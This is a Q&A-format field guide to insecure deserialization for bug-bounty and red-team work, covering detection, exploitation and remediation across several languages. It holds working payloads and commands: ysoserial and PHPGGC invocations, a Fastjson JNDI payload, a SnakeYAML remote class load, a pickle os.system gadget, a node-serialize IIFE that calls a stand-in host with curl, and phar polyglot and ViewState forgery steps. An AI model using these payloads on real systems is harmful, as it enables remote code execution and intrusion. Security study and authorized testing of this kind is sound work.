# Insecure Deserialization — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **insecure deserialization** — from "what is a gadget chain" to
> Java/PHP/.NET/Python/Ruby/Node RCE, ViewState, phar, object-tampering auth bypass, blind/OOB confirmation, chaining,
> tooling, and defense. Q&A format, progressive difficulty, impact-first. **Impact ceiling: RCE.**
>
> ⚖️ **Authorized use only.** Deserialization is RCE — confirm with a **blind DNS/OOB callback** first, prove with **one
> benign command** (`id`/`nslookup <token>`), then **STOP**. No reverse shells, no persistence, no data access, no
> lateral movement on bug bounty. Delete uploaded artifacts; tear down OOB/JNDI listeners.

**Canonical references** (cited throughout):
- **PortSwigger Web Security Academy — Insecure deserialization** (+ labs), **HackTricks — Deserialization** (per-language)
- **PayloadsAllTheThings — Insecure Deserialization**, **PentesterLab** (Java Serialize / PHP object injection / .NET)
- **OWASP** — **A08:2021 Software & Data Integrity Failures**, **Deserialization Cheat Sheet**
- **Tools:** ysoserial (Java), ysoserial.net (.NET/ViewState), PHPGGC (PHP/phar), marshalsec (JNDI), GadgetProbe, Freddy
- **CWE-502** (Deserialization of Untrusted Data), CWE-287 (auth bypass), CWE-918 (SSRF chain)
- Companion kit: `Web/Deserialization/` + `../XXE/`, `../LFI/`, `../FileUpload/`, `../JWT/`, `../SSRF/`.

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q10)
- **Level 1 — Finding & recognizing sinks** (Q11–Q20)
- **Level 2 — Confirming safely (blind/OOB)** (Q21–Q28)
- **Level 3 — Java** (Q29–Q40)
- **Level 4 — PHP (unserialize, POP, phar)** (Q41–Q52)
- **Level 5 — .NET (BinaryFormatter, ViewState)** (Q53–Q62)
- **Level 6 — Python, Ruby, Node** (Q63–Q72)
- **Level 7 — Gadget-less & object tampering** (Q73–Q80)
- **Level 8 — Escalation, chains & neighbors** (Q81–Q88)
- **Level 9 — Tooling & methodology** (Q89–Q94)
- **Level 10 — Severity, false positives & defense** (Q95–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is insecure deserialization?
A vulnerability where an app **turns attacker-controlled bytes back into objects** with a deserializer that runs code
during reconstruction. By crafting the serialized data, you control **which code executes** — typically reaching
**Remote Code Execution**. It's **CWE-502**, OWASP **A08:2021**.

### Q2. Serialization vs deserialization — quick definition?
**Serialization** = turning an in-memory object into a byte stream (to store in a cookie/session/file/message).
**Deserialization** = the reverse. The bug is deserializing **untrusted** input, because reconstruction invokes
type-specific hooks and can be steered into dangerous library code.

### Q3. Why does deserialization lead to RCE (not just bad data)?
Because deserializers call **lifecycle "magic" hooks** (`readObject`, `__wakeup`/`__destruct`, `__reduce__`,
`OnDeserialization`) and can instantiate **arbitrary types**. A **gadget chain** — a sequence of methods across
already-loaded library classes — links those hooks to a sink like `Runtime.exec`/`system()`/`os.system`. You supply the
data; the app's own classes do the execution.

### Q4. What is a "gadget chain"?
A chain of existing classes/methods (in the app or its libraries) that, when triggered during deserialization, performs
something dangerous. You don't inject code — you **re-purpose code already present** (Property-Oriented Programming). Tools
like ysoserial/PHPGGC ship ready-made chains for common libraries.

### Q5. What are "magic methods" and why do they matter?
Language hooks that run automatically during (de)serialization/object lifecycle: PHP `__wakeup`/`__destruct`/`__toString`,
Java `readObject`/`readResolve`, Python `__reduce__`, .NET `OnDeserialized`/`ISerializable`. They're the **entry point** of a
gadget chain — the first attacker-triggered code after the bytes are parsed.

### Q6. Why is deserialization "Critical"?
Because the ceiling is **RCE** (often **unauthenticated** — a cookie or ViewState). Even without a code-exec chain,
tampering a serialized **session object** gives **auth bypass / privilege escalation**. Few web bugs so reliably reach
full server compromise from a single request.

### Q7. Do I always get RCE?
No. Outcomes: **RCE** (best), **auth bypass** (object tampering, no chain needed), **SSRF** (URLDNS/gadget), **file
read/write** (phar/gadget), **DoS** (expansion). The primitive ("app deserializes my input") is the finding; the impact
depends on the language, the classpath/gadgets, and whether the blob is integrity-protected.

### Q8. What's the first thing I do with a suspicious blob?
**Recognize the format/language** from its signature (`rO0`/`O:`/`AAEAAAD`/`\x80`/`\x04\x08`/`_$$ND_FUNC$$_`). That single
step decides everything: which tool, which gadgets, which magic methods. `poc/deser_detect.py` automates it.

### Q9. What's the #1 PoC-discipline rule for deserialization?
**OOB-first, one benign command, then STOP.** Confirm with a **DNS/HTTP callback** (URLDNS or a unique-token curl) or a
bounded `sleep`, then at most run `id`/`whoami` — no reverse shells, no data reads, no persistence. It's RCE; prove it
minimally and ethically.

### Q10. How is this different from injection like SQLi/XSS?
Injection breaks out of a **value** with metacharacters. Deserialization abuses **object reconstruction** — you're not
escaping a string, you're supplying a whole object graph whose *rebuild* triggers code. The lever is types/gadgets/magic
methods, not quotes.

---

# LEVEL 1 — FINDING & RECOGNIZING SINKS

### Q11. Where do deserialization sinks live?
**Cookies/session tokens**, **.NET `__VIEWSTATE`**, API bodies/params, hidden fields, "remember me"/state tokens, **file
uploads** (serialized object / phar / pickle model), message-queue & cache payloads, and **RMI/JMX/T3/JNDI** endpoints.
Anywhere an object round-trips through the client or an untrusted source.

### Q12. How do I recognize Java serialized data?
Raw bytes `AC ED 00 05`; **base64 starts `rO0AB`**; gzip+base64 starts `H4sI`. Sink: `ObjectInputStream.readObject()`,
plus RMI/JMX/JNDI and JSON libs (Jackson/Fastjson/XStream/SnakeYAML).

### Q13. How do I recognize PHP serialized data?
Text like `O:4:"User":2:{s:4:"name";s:3:"bob";s:7:"isAdmin";b:1;}` — `O:` (object), `a:` (array), `s:`/`i:`/`b:`/`d:`
(typed values). Sink: `unserialize()`; also **`phar://`** file operations.

### Q14. How do I recognize .NET serialized data / ViewState?
BinaryFormatter starts `AAEAAAD/////` (base64) / `00 01 00 00 00 FF FF FF FF` (hex). **ViewState** is the base64
`__VIEWSTATE` hidden field (often `/wEP…`). Also `Json.NET` with `$type`.

### Q15. Python, Ruby, Node signatures?
**Python pickle** starts `\x80` + proto byte (`\x02–\x05`), base64 `gA…`; **PyYAML** unsafe = `!!python/object/apply:`.
**Ruby Marshal** = `\x04\x08`, base64 `BAh`. **Node node-serialize** contains `_$$ND_FUNC$$_`.

### Q16. What if the blob is base64/URL-encoded or gzipped?
Peel the layers: URL-decode, base64-decode, check for gzip (`\x1f\x8b`) and decompress, then match signatures.
`deser_detect.py` tries raw / base64 / urlsafe-base64 / gzip+base64 automatically.

### Q17. How do I find sinks in source/JS?
Grep for the deserializer calls: `readObject`, `unserialize`, `BinaryFormatter`/`LosFormatter`/`ObjectStateFormatter`,
`pickle.loads`/`yaml.load`, `Marshal.load`/`YAML.load`, `node-serialize`, `unserialize`, `TypeNameHandling`,
`enableDefaultTyping`, `@type`, and base64 blobs handed to any of them.

### Q18. Why is `__VIEWSTATE` such a prized target?
Because it's a **serialized object on every ASP.NET page**. If ViewState MAC is disabled (or the **machineKey** is known/
leaked), you forge a ViewState that deserializes to **unauthenticated RCE**. It's one of the most common real-world
deserialization RCEs (Telerik, SharePoint, custom apps).

### Q19. Are file uploads a deserialization surface?
Yes — a serialized object file, a **PHP phar** (any file-op on `phar://` deserializes metadata), or a **pickle model
file** (`.pkl`/`.pt`/`.joblib` load via pickle). "Upload a document/model → server loads it" is a sink.

### Q20. What's the deliverable of the recognition phase?
A confident **language + deserializer** identification for the blob, and a note on whether it's **integrity-protected**
(signed/MAC'd). That tells you which tool to use and whether tampering is even possible without the key.

---

# LEVEL 2 — CONFIRMING SAFELY (BLIND/OOB)

### Q21. How do I confirm the blob is actually deserialized (not opaque)?
**Tamper it** — change a byte/field. A **deserialization error / stack trace** (or a behavior change) proves the server
reconstructs it as an object. A trace naming `ObjectInputStream`/`unserialize`/`BinaryFormatter`/`pickle` confirms sink + language.

### Q22. What is URLDNS and why use it first?
`ysoserial URLDNS "http://token.YOUR-OOB"` builds a Java object that performs a **DNS lookup on deserialization** — **no
code execution and no gadget-library dependency**. A DNS hit to your listener **confirms deserialization cleanly and
safely**. Always do this (or a per-language callback) before firing an RCE chain.

### Q23. Why not just fire an RCE gadget immediately?
Because RCE chains are **classpath-dependent** (Java) and can be noisy/destructive if wrong. URLDNS/DNS confirmation
tells you the sink is live **without** needing the right gadget and **without** executing commands — safer and it guides
which chain to try next.

### Q24. How do I confirm blindly in PHP/.NET/Python?
- **PHP:** a gadget/phar with an HTTP/DNS callback, or object-tamper causing an observable behavior change.
- **.NET:** a ViewState/BinaryFormatter gadget whose command is `nslookup token.YOUR-OOB` (OOB), or a `sleep`.
- **Python:** `pickle_poc.py --dns token.YOUR-OOB` runs `nslookup` — a benign OOB confirm.

### Q25. What if there's no outbound network for OOB?
Use **timing** — a gadget/command that `sleep`s N seconds; a repeatable N-second delay vs baseline proves execution.
(Same idea as blind time-based SQLi.) Also try tamper-induced error differences.

### Q26. Is a URLDNS/DNS hit alone enough to report?
It confirms **deserialization of untrusted data** (a real, High finding on its own — the dangerous primitive exists). But
it is **not** RCE — don't label it RCE. Escalate to a working gadget for **Critical**, or report the confirmed primitive
as High if you can't complete a chain safely.

### Q27. How do I avoid false confirmations from scanners?
Use a **unique OOB token** per test and reproduce **manually**. If a callback arrives without your manual request, it may
be another scanner/user hitting your endpoint — correlate the token and timing before claiming it.

### Q28. What's the safe order of proof escalation?
1. **Tamper → error** (sink confirmed). 2. **URLDNS/DNS callback** (deserialization confirmed, no exec). 3. **`sleep`/OOB
via a gadget** (execution confirmed). 4. **One benign command** (`id`) for the report. Stop at the least-invasive step
that proves the severity you're claiming.

---

# LEVEL 3 — JAVA

### Q29. What's the canonical Java deserialization RCE?
`ObjectInputStream.readObject()` on attacker bytes + a **gadget chain** in a library on the classpath (famously **Apache
Commons Collections**). ysoserial generates the object; the app's libraries execute the command during reconstruction.

### Q30. Why is the gadget chain classpath-dependent?
Because the chain re-uses **specific library classes** (CommonsCollections, Spring, Groovy, ROME…). If that library
isn't loaded, the chain fails. So you must know **which libraries are present** — use **GadgetProbe** to fingerprint the
classpath, then pick the matching ysoserial chain.

### Q31. How do I use ysoserial?
```bash
java -jar ysoserial.jar CommonsCollections5 'nslookup token.YOUR-OOB' | base64 -w0
```
Drop the base64 into the deserialized cookie/param. Try `URLDNS` first (confirm), then the chain matching the classpath.

### Q32. What are Java JSON deserialization bugs?
Libraries that deserialize JSON into **polymorphic types** based on a type hint in the data: **Jackson**
(`enableDefaultTyping`/`@class`), **Fastjson** (`@type`), **XStream** (XML). A crafted `@type`/`@class` instantiates a
gadget (e.g. `JdbcRowSetImpl` → **JNDI** lookup) → RCE. Extremely common in modern APIs.

### Q33. What's the Fastjson `@type` → JNDI attack?
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-OOB:1389/Exploit","autoCommit":true}
```
Fastjson instantiates `JdbcRowSetImpl`, which does a **JNDI lookup** to your LDAP server (run via **marshalsec**), which
returns a malicious class → RCE. Same JNDI back-half as Log4Shell.

### Q34. What is SnakeYAML deserialization?
`yaml.load()` (SnakeYAML) instantiating arbitrary Java types:
`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR-OOB/"]]]]` → loads a remote
class → RCE. A YAML-config or YAML-API endpoint is the sink.

### Q35. What are RMI/JMX/T3 deserialization endpoints?
Java remote services (RMI registry, JMX, WebLogic **T3**) that deserialize objects over the network. Send a gadget over
the protocol → RCE. WebLogic T3 has a long CVE history (CVE-2015-4852, 2017-3248, 2019-2725…). Red-team/internal-heavy.

### Q36. What is JEP 290 / ObjectInputFilter?
Java's **look-ahead deserialization** filter (JDK 9+, backported) that **allow-lists/deny-lists classes** before
instantiation. Properly configured, it blocks gadget classes → your chain fails. When testing, a failing chain may mean
a filter is in place (or the library isn't present) — try other chains/JSON libs.

### Q37. How does Log4Shell relate to Java deserialization?
Log4Shell (`${jndi:ldap://…}`) triggers a **JNDI lookup → remote class load → deserialization/RCE**. The **trigger** is a
logged string (not a serialized blob), but the **back half** (JNDI → RCE) is the **same family** and uses the same
marshalsec LDAP/RMI server. Report the JNDI-string bug separately; reuse the tooling.

### Q38. How do I deliver a Java payload that isn't base64 in a cookie?
Depends on the sink: RMI/JMX/T3 take the **raw object** over the protocol; HTTP sinks usually take **base64** (sometimes
gzip+base64) in a cookie/param/header; some take it in a multipart upload. Match the encoding the app expects (recognize
from the original blob).

### Q39. What if I don't know the classpath at all?
Start with **URLDNS** (confirms deserialization, no libs needed), then **GadgetProbe** to enumerate loaded gadget
libraries, then fire the matching chain. If none match, try the **JSON/YAML** libraries (Fastjson/Jackson/SnakeYAML) which
often work independent of the CC-style classpath.

### Q40. Java severity?
`readObject`/JNDI/ViewState-equivalent → **RCE = Critical** (often unauth). URLDNS-only confirmed but no working chain =
**High** (primitive present). SSRF via URLDNS/gadget = High–Medium. Lead with the command/callback you achieved.

---

# LEVEL 4 — PHP (unserialize, POP, phar)

### Q41. What is PHP Object Injection?
Passing a serialized **object** to `unserialize()` on user input. During reconstruction/cleanup, the object's **magic
methods** (`__wakeup`/`__destruct`/`__toString`) run — and a **POP chain** across the app's classes can reach a dangerous
sink (`system`, `file_put_contents`, SQL) → RCE, or you tamper properties for auth bypass.

### Q42. What is a POP chain?
**Property-Oriented Programming** — you set an object's properties so that when its magic method runs, it calls another
object's method, and so on, until reaching a sink. **PHPGGC** ships POP chains for common frameworks (Laravel, Symfony,
WordPress, Monolog, Guzzle…).

### Q43. How do I use PHPGGC?
```bash
phpggc -l                                    # list chains
phpggc Laravel/RCE1 system 'curl http://YOUR-OOB/p'   # serialized string for unserialize()
```
Inject the output into the `unserialize()` sink (cookie/param). Match the chain to the framework the app uses.

### Q44. What is phar deserialization and why is it huge?
A **Phar** archive stores serialized **metadata**. Any PHP **file operation** on a `phar://` path — `file_exists`,
`fopen`, `getimagesize`, `md5_file`, `is_dir`, `include`… — **deserializes that metadata** with **no `unserialize()`
call**. So even apps that never call `unserialize()` on input are exploitable if you control a file path.

### Q45. How do I exploit phar deserialization?
Build a phar with a POP chain (`phpggc -p phar -o evil.phar Monolog/RCE1 system id`), **disguise it** (GIF/JPEG polyglot
so image validators pass), **upload** it, then trigger a **file operation** on `phar://uploaded.jpg/x` (e.g. an image
resize/preview) → the metadata deserializes → POP chain → RCE.

### Q46. How do I make a phar pass an image filter?
Prepend image magic bytes: `phpggc -p phar -pj 'GIF89a' -o evil.gif …` produces a **GIF/phar polyglot** — it's a valid GIF
to a validator and a valid phar to `phar://`. Same idea for JPEG. Then find a `phar://`-reachable file op.

### Q47. What is the `__wakeup` bypass (CVE-2016-7124)?
In old PHP, declaring an object with a **property count greater than the number supplied** causes `__wakeup()` to be
**skipped** during unserialize. Useful when `__wakeup` would sanitize/reset your tampered properties — bypass it by
mismatching the count. `php_object_poc.py --wakeup-bypass` builds it.

### Q48. How does type juggling help in PHP deserialization?
If a magic method compares with loose `==` (e.g. `if ($this->token == $secret)`), you can set the property to a value
that loosely-equals (e.g. `0` vs a string, or `true`) to bypass a check — an auth bypass within the object's own logic.

### Q49. What if there's no PHPGGC chain for the framework?
**Read the source** and build a **custom POP chain**: find a class with a `__destruct`/`__wakeup` (or `__toString`) that
does something dangerous, then a property path to reach it. This is the "expert" PHP move when frameworks don't have a
ready chain.

### Q50. Can I get auth bypass without any chain?
Yes — if the app `unserialize()`s a **session/user object** and you can edit it (unsigned), flip `isAdmin`/`role`/`user`
(`php_object_poc.py`). No code exec needed; it's a High–Critical **privilege escalation** on its own.

### Q51. Where does PHP deserialization appear beyond cookies?
Laravel `X-XSRF-TOKEN`/session (CVE-2018-15133 with a leaked `APP_KEY`), WordPress/Magento phar via image processing,
form fields, cache entries, and any `unserialize()` on user data. Grep for `unserialize(` and `phar://`-reachable file ops.

### Q52. PHP severity?
POP-chain/phar → **RCE = Critical**. Object-tamper auth bypass = **High–Critical**. `unserialize()` on input with no
reachable chain yet = **High** (primitive). Lead with the command executed or the privilege gained.

---

# LEVEL 5 — .NET (BinaryFormatter, ViewState)

### Q53. Which .NET serializers are dangerous?
`BinaryFormatter`, `LosFormatter`, `ObjectStateFormatter` (**ViewState**), `SoapFormatter`, `NetDataContractSerializer`,
`Json.NET` with `TypeNameHandling != None`, and `XmlSerializer` with attacker-controlled type. Microsoft has officially
deprecated `BinaryFormatter` because it's inherently unsafe.

### Q54. How do I exploit .NET deserialization?
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c nslookup token.YOUR-OOB" -o base64
```
Drop the base64 into the sink. Pick the `-f` formatter to match the target and `-g` gadget (TypeConfuseDelegate,
ObjectDataProvider, WindowsIdentity, DataSet…).

### Q55. Walk me through ViewState RCE.
`__VIEWSTATE` is a serialized object. If **`EnableViewStateMac=false`** (no integrity), forge a malicious ViewState with
`ysoserial.net -p ViewState` → **unauthenticated RCE**. If MAC is on, you need the **`machineKey`** (validationKey) —
often leaked in `web.config` (read it via **XXE/LFI**) or a known Telerik/default key.

### Q56. How do I forge a MAC'd ViewState?
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup token.YOUR-OOB" \
  --path="/page.aspx" --apppath="/" --generator=<__VIEWSTATEGENERATOR> --validationkey=<HEXKEY> --validationalg=SHA1
```
You need the page **path**, the **`__VIEWSTATEGENERATOR`** value (from the page), and the **validationkey/alg** (leaked
key). Then it deserializes to RCE.

### Q57. What is the Json.NET `$type` attack?
With `TypeNameHandling.Objects/All`, Json.NET instantiates the type named in **`$type`**. Supply
`System.Windows.Data.ObjectDataProvider` (or similar) to invoke a method (`Process.Start`) → RCE. Any Json.NET endpoint
with non-`None` TypeNameHandling is a candidate.

### Q58. Where do I find the machineKey if MAC is on?
Leaked `web.config` (via **XXE** `php://filter`-equivalent file read, **LFI**, path traversal, backup files), a **known
Telerik** encryption key (CVE-2017-11317/CVE-2019-18935), a **default/example** key copied into prod, or source
disclosure. The XXE/LFI kits are your feeders here.

### Q59. Is ViewState RCE usually authenticated?
Often **unauthenticated** when MAC is disabled (the page processes ViewState before auth), which makes it a top-severity
finding. With MAC on + leaked key it's still typically pre-auth on the target page. Either way, Critical.

### Q60. What is Telerik CVE-2019-18935?
A .NET deserialization RCE in Telerik UI for ASP.NET AJAX's `RadAsyncUpload` — you encrypt a payload with a known/leaked
key and it deserializes to RCE. A recurring real-world .NET deserialization bug worth checking on ASP.NET targets.

### Q61. How do I deliver a benign .NET proof?
Set the gadget command to `cmd /c nslookup token.YOUR-OOB` (OOB DNS) or `cmd /c ping -n 11 127.0.0.1` (a ~10s delay). A
DNS hit / timing delta proves execution without touching data. Then optionally `whoami` for the report and stop.

### Q62. .NET severity?
ViewState/BinaryFormatter/Json.NET → **RCE = Critical** (unauth ViewState is worst-case). Lead with the callback/command;
note whether it required a leaked key or none (no-key = higher).

---

# LEVEL 6 — PYTHON, RUBY, NODE

### Q63. Why is Python pickle the easiest RCE?
`__reduce__` lets an object declare a **callable + args** that `pickle.loads` executes on load:
```python
class E:
    def __reduce__(self): return (os.system, ("id",))
```
Any `pickle.loads` on untrusted data = trivial RCE. `poc/pickle_poc.py` builds a benign version.

### Q64. Where does pickle deserialization appear?
Session/cache data, API params, and — big — **ML model files** (`.pkl`, `.pt`/PyTorch, `.joblib`, some `.h5`) that load
via pickle. Uploading or loading an attacker model = RCE. `celery`/`redis` with a pickle serializer are internal sinks.

### Q65. What is the PyYAML deserialization bug?
`yaml.load(data)` with an **unsafe loader** (the pre-5.1 default) instantiates Python objects from tags:
`!!python/object/apply:os.system ["id"]` → RCE. The fix is `yaml.safe_load`. jsonpickle has an analogous `py/object`
issue.

### Q66. How do I exploit Ruby deserialization?
`Marshal.load` on untrusted bytes, or `YAML.load`/`Psych` (Rails **CVE-2013-0156**). Ruby has a well-known **universal
gadget** (stdlib-only) usable via Marshal or YAML → RCE. Historically Rails deserialized YAML from params — a classic
mass-exploited bug.

### Q67. How do I exploit Node deserialization?
`node-serialize`'s `unserialize()` executes an **IIFE**:
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR-OOB/n',()=>{})}()"}
```
base64 it into the deserialized cookie/param. `serialize-javascript`, `funcster`, old `js-yaml`, and `cryo` have similar
issues.

### Q68. How does prototype pollution relate to Node deserialization?
Prototype pollution corrupts `Object.prototype`, and a **gadget** elsewhere turns that into RCE/XSS/DoS. Deserialization
of JS objects is a common way to **introduce** the pollution, and the two are frequently chained. (Cross-ref the coming
Prototype-Pollution kit.)

### Q69. Are these languages' sinks always unauth?
Depends on where the blob is. A pickle/Marshal/node-serialize **session cookie** is often reachable **unauthenticated**;
an ML-model upload may need an account; an internal queue is post-auth/internal. Note the reachability for severity.

### Q70. What's the safe proof for pickle/YAML/Node?
`os.system('nslookup token.YOUR-OOB')` / `child_process.exec('curl …token…')` — a **benign OOB callback**, or a `sleep`.
`pickle_poc.py --dns token` and the Node IIFE with a curl-to-OOB do this. One callback = proof; then stop.

### Q71. Do ML pipelines really have pickle RCE?
Yes — loading a `.pkl`/`.pt`/`.joblib` model with `pickle`/`torch.load` executes `__reduce__`. Model hubs and
"upload your model/notebook" features are a live, high-value pickle-RCE surface (and a supply-chain risk).

### Q72. Python/Ruby/Node severity?
pickle/PyYAML/Marshal/YAML/node-serialize → **RCE = Critical**. Model-file pickle load = Critical (often needs upload/
account, adjust PR). Lead with the callback/command.

---

# LEVEL 7 — GADGET-LESS & OBJECT TAMPERING

### Q73. What if I confirm deserialization but have no gadget chain?
Three moves: (1) **object tampering** for **auth bypass** (flip fields — no chain needed); (2) **custom POP/gadget from
source** (PHP/Java) if you have code; (3) report the **confirmed primitive** (URLDNS/DNS) as **High** — "unauthenticated
deserialization of untrusted data" is a real finding even before a working RCE chain.

### Q74. How does object tampering give auth bypass?
If the serialized blob **is** the session/user state (unsigned), edit `isAdmin:false→true`, `role:user→admin`, or the
`userId` to another user, re-encode, and send it back. The app trusts the reconstructed object → privesc/impersonation.
No code execution required.

### Q75. When is object tampering blocked?
When the blob is **integrity-protected** (HMAC/signature) and you don't have the key — you can't tamper without breaking
the MAC. Then it's only exploitable if the key is **leaked/weak/default**, or you find an **RCE gadget** (which doesn't
need to preserve app-level meaning the same way). Don't claim tampering works if a MAC stops it.

### Q76. How do I build a custom POP chain (PHP) from source?
Find a class whose `__destruct`/`__wakeup`/`__toString` performs a **dangerous action** using an **object property**
(e.g. `call_user_func($this->callback, $this->arg)`, `file_put_contents($this->path, $this->data)`). Set those properties
so the action becomes your RCE/file-write. Chain multiple classes if needed to reach the sink.

### Q77. How do I build a custom gadget in Java without ysoserial chains?
Look for classes implementing `Serializable` with a `readObject`/`readResolve` that invokes something reachable (a
method call on a field, a lookup, reflection). It's advanced/source-heavy; usually you first exhaust ysoserial +
JSON-lib gadgets, then hand-build only for hardened targets.

### Q78. Can deserialization give SSRF instead of RCE?
Yes — **URLDNS** (Java) makes an outbound request; other gadgets can be steered to fetch URLs. If a full RCE chain isn't
available but a URL-fetch gadget is, you have **SSRF** via deserialization (chain to `../SSRF/` for metadata/creds).

### Q79. Can deserialization cause DoS?
Yes — expansion/recursive object graphs (a "billion-laughs"-style blow-up) can exhaust memory/CPU. Usually **out of
scope** and you shouldn't fire it on prod; note the primitive if in scope. CWE-400/502.

### Q80. What's the value of reporting a confirmed-but-unexploited primitive?
High — "the app deserializes untrusted input (confirmed via URLDNS)" is a **known-dangerous** condition that triagers
often accept as **High** even before a public RCE chain, because it's exploitable in principle and a fix is warranted.
Report the confirmation honestly (not as RCE).

---

# LEVEL 8 — ESCALATION, CHAINS & NEIGHBORS

### Q81. What are the killer deserialization chains?
① **XXE/LFI reads `web.config` machineKey → ViewState RCE.** ② **File-upload polyglot phar → file-op → PHP POP RCE.**
③ **Session-cookie deserialization → URLDNS confirm → CommonsCollections RCE.** ④ **Fastjson `@type` → JNDI (marshalsec)
→ RCE** (Log4Shell family).

### Q82. How does XXE/LFI feed .NET deserialization?
The blocker for ViewState RCE (with MAC on) is the **machineKey**. Read `web.config` via **XXE** (`php://filter`-style
file read) or **LFI/path-traversal/backup files** to obtain the validationKey, then forge the ViewState. Two Medium bugs
chain into a Critical.

### Q83. How does file upload feed PHP deserialization?
Upload a **phar/image polyglot** (a Medium upload bug) and trigger a `phar://` file operation → PHP POP chain → **RCE**.
The upload alone might be low; combined with a reachable file-op it's Critical. (Cross-ref `../FileUpload/`.)

### Q84. How does deserialization feed other attacks?
Deser-read a **JWT/HMAC signing secret** → forge tokens (`../JWT/`). Deser-RCE → read source/creds → pivot. Deser-SSRF →
metadata → cloud pivot. It's usually the **terminal** bug (RCE), but its byproducts (secrets, source) unlock more.

### Q85. Deserialization vs Log4Shell — same or different?
**Different trigger, shared back-half.** Log4Shell is a **JNDI string injection** into a logger; classic deserialization
is a **serialized-blob** sink. Both often end in **JNDI → remote class load → RCE** and use marshalsec. Report them as
separate bugs; reuse the LDAP/RMI server.

### Q86. Deserialization vs XXE / SSTI / mass assignment?
- **XXE:** XML external entities (file read/SSRF) — different mechanism, but **feeds** deserialization (machineKey).
- **SSTI:** template-engine code eval — different sink; don't mislabel a template `{{7*7}}` as deserialization.
- **Mass assignment:** binds JSON fields to a model (data tampering) — related to object tampering but not a deserializer RCE.

### Q87. How do I decide it's deserialization vs "just a signed token"?
A **JWT** is a signed token you **can't tamper without the key** — that's a JWT bug (`../JWT/`), not deserialization RCE.
A **serialized object blob** (rO0/O:/pickle) that the server reconstructs is deserialization. If it's signed serialized
data, you need the key to tamper — then it converges with the "MAC'd blob" case.

### Q88. What's the red-team angle on deserialization?
Internal **RMI/JMX/T3/JNDI**, message queues (RabbitMQ/Kafka with object serializers), caches (Redis pickle), CI/build
systems (Jenkins), and app servers (WebLogic/JBoss/WebSphere) are deserialization-rich and often reachable post-foothold
→ lateral RCE. It's a staple internal-network escalation.

---

# LEVEL 9 — TOOLING & METHODOLOGY

### Q89. What are the essential tools?
**ysoserial** (Java), **ysoserial.net** (.NET/ViewState), **PHPGGC** (PHP + phar), **marshalsec** (JNDI/JSON/YAML
servers), **GadgetProbe** (Java classpath fingerprint), **Freddy** (Burp — Java/.NET deser scanner), and this kit's
`poc/` (deser_detect, pickle_poc, php_object_poc, ysoserial_cheat).

### Q90. What's the fastest methodology on a new target?
Find serialized blobs (cookies/ViewState/tokens/uploads) → **recognize the language** (`deser_detect.py`) → **tamper +
URLDNS/DNS confirm** → fire the **matching gadget tool** for a **benign** RCE proof (or **tamper** for auth bypass) →
escalate/chain → report CWE-502.

### Q91. How do I keep false positives low?
Require **execution proof** (OOB callback / `sleep` / `id`), not just "it's serialized data". Check the blob isn't
**MAC'd** (else you need the key). Use a **unique OOB token** and reproduce manually. Distinguish a confirmed **primitive**
(URLDNS) from actual **RCE** in the report.

### Q92. How do I test when I can't run Java/.NET tools locally?
Use Kali/WSL (they have Java; ysoserial/marshalsec are JARs; ysoserial.net runs under mono/Windows). For quick native
work, `deser_detect.py`/`pickle_poc.py`/`php_object_poc.py` are pure Python. For Java gadgets you do need the JARs — keep
them in your WSL toolbox.

### Q93. How do I fingerprint which Java gadget will work?
**GadgetProbe** (Burp) sends probes that reveal whether specific classes are on the classpath (via DNS callbacks per
class), so you learn which library is present and pick the matching ysoserial chain instead of blindly trying all of them.

### Q94. How do I stay current?
Follow deserialization CVEs (WebLogic/Fastjson/Telerik/Laravel/Struts), PortSwigger research + labs, the ysoserial/
ysoserial.net/PHPGGC repos (new gadgets), and HackTricks per-language pages. New gadget chains and new vulnerable
libraries drop constantly; the core technique is stable.

---

# LEVEL 10 — SEVERITY, FALSE POSITIVES & DEFENSE

### Q95. How do triagers rate deserialization?
```
Deserialization → RCE (any language/ViewState/phar)         Critical
Object tampering → auth bypass / privesc                     Critical–High
Confirmed deser primitive (URLDNS/blind), no gadget yet      High
Deserialization → SSRF                                        High–Medium
Deserialization → DoS only                                   Medium
```

### Q96. What are the most common false positives?
- "This base64 decodes to a serialized object" (recognition ≠ exploitable).
- A deserialization **error** on tamper with no callback/RCE shown.
- The blob is **MAC'd/signed** and you lack the key.
- A **URLDNS/DNS-only** hit reported **as RCE** (it's confirmation, not exec).
- A **safe** deserializer (`yaml.safe_load`, allow-listed types) with no unsafe path.

### Q97. What CVSS/CWE do I use?
**CWE-502** is the anchor (+ CWE-287 for auth bypass, CWE-918 for SSRF chain). RCE vector ≈
`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (~9.8 unauth) — drop `PR:N` to `PR:L` if authenticated; note if a leaked key was
needed. Lead with the **command executed / callback received**.

### Q98. What's the correct remediation?
**Don't deserialize untrusted data.** Prefer a data-only format (JSON with a schema). If unavoidable: **integrity-protect**
the blob (HMAC) **and restrict types** — Java **ObjectInputFilter (JEP 290)** allow-list; .NET drop `BinaryFormatter`/
`LosFormatter`, enable ViewState MAC + rotate `machineKey`; PHP avoid `unserialize()` on input (use `json_decode`), block
`phar://`; Python `yaml.safe_load` + never `pickle.loads` untrusted; Ruby `YAML.safe_load`; Node never `node-serialize`
untrusted.

### Q99. If I can only fix one thing, what is it?
**Stop deserializing untrusted input with a native/polymorphic deserializer.** Replace it with a **data-only** parser
(JSON + schema validation) that never instantiates arbitrary types. That removes the gadget-execution capability
entirely — the root cause.

### Q100. Give the defender's one-paragraph summary.
Treat serialized input as hostile code: **don't deserialize untrusted data with object/polymorphic deserializers** —
use JSON with a schema. Where native serialization is unavoidable, **integrity-protect** the blob (HMAC with a rotated
secret) **and** enforce **type allow-listing** (Java `ObjectInputFilter`/JEP 290; .NET avoid `BinaryFormatter`, ViewState
MAC + strong `machineKey`; PHP no `unserialize()` on input + disable `phar://`; Python `yaml.safe_load`, never untrusted
`pickle`; Ruby `safe_load`; Node no `node-serialize`). Run the app **least-privilege with egress filtering** so even a
